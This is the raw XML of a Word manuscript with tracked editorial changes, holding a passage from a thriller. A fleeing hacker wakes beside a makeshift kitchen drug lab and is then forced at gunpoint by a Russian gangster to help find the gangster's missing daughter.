crunching noise, and a man shrieked. The injured foe retreated, several people coming to his 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sea of hands released him, and the crowd of vigilant citizens backed away in terror. A vacant ring surrounded him, none daring to come within his reach.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His eyes darted around the pavilion, </w:t>
      </w:r>
      <w:ins w:id="2537" w:author="TextVet" w:date="2016-03-23T16:23:00Z">
        <w:r w:rsidR="0095320B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>see</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2538" w:author="TextVet" w:date="2016-03-23T16:23:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0095320B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>loo</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>king</w:t>
      </w:r>
      <w:del w:id="2539" w:author="TextVet" w:date="2016-03-23T16:23:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0095320B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> for</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> an escape. The narrow crisscrossing walkways, the rolling street carts, the convoluted networks of stairs and ramps throughout Pike Place Market would serve him well. But he had to move fast. Not only because the police were surely on their way, but because…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“Rosie,” he gasped. “My Rosie…!” He reached for the pocket where he typically kept his cellphone. It wasn’t there. He had destroyed it the previous night. “They’ll… Oh God…!”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bolted from the pavilion. A few brave people tried </w:t>
      </w:r>
      <w:del w:id="2540" w:author="TextVet" w:date="2016-03-23T16:23:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B97C0B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">to </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>stop</w:t>
      </w:r>
      <w:ins w:id="2541" w:author="TextVet" w:date="2016-03-23T16:23:00Z">
        <w:r w:rsidR="00B97C0B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ping</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> him. He swept them aside like curtains.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straightening his shirt and gesturing graciously to the intervening bystanders, called out after him, “Sergey, don’t bother! I’m sure that he already has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old scientist’s choice of words was deliberate. In Russian, the verb “to have” is never used in reference to a woman or girl unless it is intended to convey a very specific implication.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00F62BCE">
      <w:pPr>
        <w:pStyle w:val="ChapterNum"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>24</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i/>
          <w:iCs/>
          <w:smallCaps/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Thump-Thump! thump thump!</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> Thump-thump thump…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vaguely recognized the music.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eyes opened slowly. The angle of the daylight hinted at an hour well past noon.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His shoulder wound flared </w:t>
      </w:r>
      <w:ins w:id="2542" w:author="TextVet" w:date="2016-03-23T16:25:00Z">
        <w:r w:rsidR="00393895">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>sorely</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2543" w:author="TextVet" w:date="2016-03-23T16:25:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00393895">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>with pain</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> as he stirred awake</w:t>
      </w:r>
      <w:ins w:id="2544" w:author="TextVet" w:date="2016-03-23T16:25:00Z">
        <w:r w:rsidR="002A5149">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2545" w:author="TextVet" w:date="2016-03-23T16:25:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00030422">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>, and</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> his hand still st</w:t>
      </w:r>
      <w:ins w:id="2546" w:author="TextVet" w:date="2016-03-23T16:26:00Z">
        <w:r w:rsidR="002A5149">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>i</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2547" w:author="TextVet" w:date="2016-03-23T16:26:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="002A5149">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>u</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ng</w:t>
      </w:r>
      <w:ins w:id="2548" w:author="TextVet" w:date="2016-03-23T16:26:00Z">
        <w:r w:rsidR="002A5149">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from the burn</w:t>
      </w:r>
      <w:ins w:id="2549" w:author="TextVet" w:date="2016-03-23T16:26:00Z">
        <w:r w:rsidR="002A5149">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>:</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2550" w:author="TextVet" w:date="2016-03-23T16:26:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="002A5149">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del w:id="2551" w:author="TextVet" w:date="2016-03-23T16:26:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="002A5149">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">His injuries served as </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">unavoidable reminders of the </w:t>
      </w:r>
      <w:ins w:id="2552" w:author="TextVet" w:date="2016-03-23T16:27:00Z">
        <w:r w:rsidR="009C4228" w:rsidRPr="000D3488">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>previous day</w:t>
        </w:r>
        <w:r w:rsidR="009C4228">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>’s</w:t>
        </w:r>
        <w:r w:rsidR="009C4228" w:rsidRPr="000D3488">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horrors</w:t>
      </w:r>
      <w:del w:id="2553" w:author="TextVet" w:date="2016-03-23T16:27:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="009C4228">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> of the previous day</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a trail of thin claw-marks on his chest reminded him that yesterday hadn’t been </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>all</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> bad</w:t>
      </w:r>
      <w:del w:id="2554" w:author="TextVet" w:date="2016-03-23T16:27:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00626CB7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> after all</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stood up and donned pajamas, taking his time. He no longer had a job to show up late for. Most importantly, he had a brilliant and beautiful young woman playing </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Dance Dance Revolution</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> in the next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he opened the bedroom door, the stench of acetone and kerosene stung his nostrils. The kitchen still contained the cluttered trappings of an impromptu biochemical laboratory. Near the sink, he noticed several new items: metal buckets with stirring rods alongside bottles of nail polish remover, industrial-strength drain cleaner, and heating oil.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music stopped.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“If you see your shadow,” said Tina, “do we get six more weeks of winter?”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“Good morning,” Danny croaked. “Or afternoon. How long was I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almost three. I was getting bored!”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I’m starving. I see you’ve been cooking?”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“Eating anything in here would be an astonishingly bad idea,” she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here I was looking forward to a nice hearty bacteria stew. How’s the broth doing?”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“See for yourself!” Tina gestured at the pot with the flourish of a game show host.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lifted the lid and was assaulted by the fetid sink of brackish swamp water. He took one look at the blobs of slime bobbing in the rancid yellow-brown soup and slammed the pot closed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in an exponential growth phase. The bacteria can double their population every half hour.”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worked the math. “So after ten hours… That tiny speck you started with has multiplied by a factor of over a million by now. That’s… a lot.”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biology!”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chuckled. “Proud of yourself, are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“Well, I damn well should be! I’ve been stuck behind a reception desk for almost two years, when </w:t>
      </w:r>
      <w:del w:id="2555" w:author="TextVet" w:date="2016-03-23T16:31:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00CF4874">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">what </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>I really should have been doing</w:t>
      </w:r>
      <w:del w:id="2556" w:author="TextVet" w:date="2016-03-23T16:31:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00CF4874">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> is</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>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Behold my awesome powers!” She lifted her head theatrically and splayed her black-nailed fingers.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pulled her close. She wrapped her arms around his waist. “So, when will we know if it works?” he asked. “If it actually makes the… you know… the drug?”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 already do.” She looked toward the kitchen counter.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followed her gaze. On the countertop, between the scattered glassware, several delicate parallel lines of fine white powder stood out against the black granite.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did some shopping while you were asleep,” said Tina. “I picked up glutamate from Super Supplements. Everything else I found at Home Depot. I paid for everything with cash, so there’s no trail. Hanging out with you freaky hacker guys is teaching me a thing or two.”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something?” he said with a devilish smirk. “I’m beginning to think that you’re kind of smart. For a girl, anyway.”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pressed her body against his. “You’re a dick.”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Their lips met in a kiss that broke his mind free of the bonds of gravity.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a voice soft and breathy, Tina asked him, “Have you ever tried it, by the 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“Tried what?” he asked as he kissed his way down her neck.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“Cocaine.”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“Me? No. No way. Have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“Eh, I’ve indulged,” she said, her fingertips running along his back. “But I think my clubbing days are behind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turned his attention to her earlobe. “What does it feel like?” he whispered between nibbles.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“Kind of like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definitely never, ever going to touch the stuff, then.”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you don’t like it?” she teased.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“I’d never be able to stop.”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Kissing continued, growing more vigorous. Fingers glided through hair and brushed across skin. A bra strap slid down over a shoulder.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doorbell rang.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tried to ignore it. It rang again. “Did you order pizza or something?” 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shook her head.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probably some Jehovah’s Witnesses. Don’t go anywhere.” With a final kiss, Danny reluctantly headed for the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peephole showed nobody outside. “What the hell?” Confused, he flipped the deadbolt, turned the knob, and began pulling. “Hello…?”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 immense dark blur hurled through the doorway, thrusting the door back against Danny. He fell backward, landing hard on the smooth wood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looked up, and found himself staring into the long black barrel of a handgun. And on the other side of that gun, silhouetted in the doorway, towered the massive shape of Sergey Mukhayev.</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scurried backwards. Sergey followed, matching the pace of Danny’s scuttles with a slow, relentless footfall. He kept the gun pointed squarely between Danny’s eyes as he marched into his home like a stone golem. Without breaking his gaze, he kicked the front door of the house closed behind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screamed. There was a metallic rummaging commotion from the kitchen. She stood holding a large knife with both hands, pointing it at Sergey with as much menace as she could muster — which was not a lot.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Sergey ignored her entirely. He towered over Danny like an enraged colossus and snarled, “Get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whimpered, and struggled to his feet. “How… How did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grabbed Danny by the throat and pinned him against the wall. “You…” Sergey seethed. “It is all you! I am up in this ass because of you! You nearly killed my nephew. Twice. You tricked me into ordering lockdown. You blew up my factory, got one of my soldiers killed, got another badly wounded. And I am running out of cars!”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I’m sorry!” Danny squeezed </w:t>
      </w:r>
      <w:del w:id="2557" w:author="TextVet" w:date="2016-03-23T16:35:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0063533D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">out </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>through his constrained larynx.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looked at him with an expression typically used for things stuck to the bottom of a shoe. “I have only one thing now. One thing I am left with.” Sergey shoved the muzzle of the gun against Danny’s chest. “You. I have you. And you do not look like much. But I know you are one clever little shit. And, God willing, maybe that will be enough.”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felt the gun pressing into his ribs. It was shaking.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as Sergey looked into his eyes, Danny noticed something beyond the rage, deeper than the contempt. It was unbelievable, but unmistakeable: the man holding Danny’s life literally in his hand was terrified.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRDefault="000D3488" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:ins w:id="2558" w:author="TextVet" w:date="2016-03-23T16:36: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would love nothing more,” said Sergey, “than to kill you right now, clean and easy. But I need you to save my daughter.”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B42F3F" w:rsidRPr="000D3488" w:rsidRDefault="00B42F3F" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pP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Danny dropped hard into the chair</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> at the computer desk in his bedroom.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leaned down over his shoulder. “We will have no funny business, understand? I know you will find some sneaky way to use computer to call for help. Well, let me tell you something. If I hear anybody come to this house… Anybody! Police. Friend. Neighbor. Newspaper delivery boy. Even stray cat. …Then I shoot you dead that moment. I will not even think about it. And then I will use her…”</w:t>
      </w:r>
      <w:ins w:id="2559" w:author="TextVet" w:date="2016-03-23T16:37:00Z">
        <w:r w:rsidR="003B5DE4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>—</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2560" w:author="TextVet" w:date="2016-03-23T16:37:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003B5DE4">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He gestured to Tina behind him</w:t>
      </w:r>
      <w:ins w:id="2561" w:author="TextVet" w:date="2016-03-23T16:37:00Z">
        <w:r w:rsidR="00F14C1A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="2562" w:author="TextVet" w:date="2016-03-23T16:36:00Z">
        <w:r w:rsidR="003B5DE4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>—</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2563" w:author="TextVet" w:date="2016-03-23T16:36:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003B5DE4">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“…as hostage for me to escape. I am being clear to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“Crystal,” Danny squeaked.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warily eyed the windows on Danny’s large monitor. “What kind of computer is this, anyway? It is not Windows, it is not Mac…”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“It’s Ubuntu,” Danny answered.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is what computer hackers use?”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“Actually, yeah…”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snorted. “Well then! Start it! Do the hacking!”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stared blankly at the screen. “It… Um… It’s not… It doesn’t work like that… You’ve got to give me something to go on. Some kind of lead. What’s her name? Where was she last seen? How old is she?”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“Twelve. She was at her dancing school. Teachers said she left for lunch and never came back.”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she’s just cutting class?” Danny asked. As soon as he had said it, he flinched, expecting a fist to the temple and a loud Russian-accented lecture about Sergey’s precious little angel being the sweetest, most well-behaved cherub in all of God’s Creation.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he heard instead was a stifled chuckle. “You have raised a daughter?” said Sergey. Danny shook his head. “It is true</w:t>
      </w:r>
      <w:ins w:id="2564" w:author="TextVet" w:date="2016-03-23T16:38:00Z">
        <w:r w:rsidR="008B7032">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>;</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2565" w:author="TextVet" w:date="2016-03-23T16:38:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008B7032">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she is always trying to get away with trouble. Just like her old man. But… There is a man in the city today. Old business colleague. Things went very bad between us many years ago. And in this business, when things go bad…”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see…,” Danny said, wincing. He opened a web browser, bringing up the plain white expanse of the Google search page. “Let’s start with the obvious. What’s this man’s name?”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is called Ivan Zheleznov,” said Sergey. “In English, you write it ‘Z’, ‘h’…”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said, “Wait, Iv—?” She promptly cut herself off.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both turned to her. Sergey asked pointedly, “You have heard about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reluctantly replied, “Is he from Saint Petersburg? Super rich? Owns companies all over the world?”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said Sergey. “You know this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said, “He’s staying at the Medina Gallante, in the Presidential Suite.”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asked, “The big fancy lakeside hotel between Mercer and the 520 bridge?”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turned back around to the computer and started typing.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w:t>
      </w:r>
      <w:ins w:id="2566" w:author="TextVet" w:date="2016-03-23T16:40:00Z">
        <w:r w:rsidR="00FC7D8D">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 xml:space="preserve"> </w:t>
      </w:r>
      <w:del w:id="2567" w:author="TextVet" w:date="2016-03-23T16:39:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F83CFD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>conti</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="2568" w:author="TextVet" w:date="2016-03-23T16:40:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F83CFD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">nued </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>star</w:t>
      </w:r>
      <w:ins w:id="2569" w:author="TextVet" w:date="2016-03-23T16:40:00Z">
        <w:r w:rsidR="00FC7D8D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>e</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2570" w:author="TextVet" w:date="2016-03-23T16:40:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00FC7D8D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>ing</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:ins w:id="2571" w:author="TextVet" w:date="2016-03-23T16:40:00Z">
        <w:r w:rsidR="00F83CFD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">bored </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>at her. “How do you know this</w:t>
      </w:r>
      <w:del w:id="2572" w:author="TextVet" w:date="2016-03-23T16:39:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00095164">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w:t>
      </w:r>
      <w:ins w:id="2573" w:author="TextVet" w:date="2016-03-23T16:39:00Z">
        <w:r w:rsidR="00095164">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w:t>
      </w:r>
      <w:del w:id="2574" w:author="TextVet" w:date="2016-03-23T16:40:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008A3FD4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
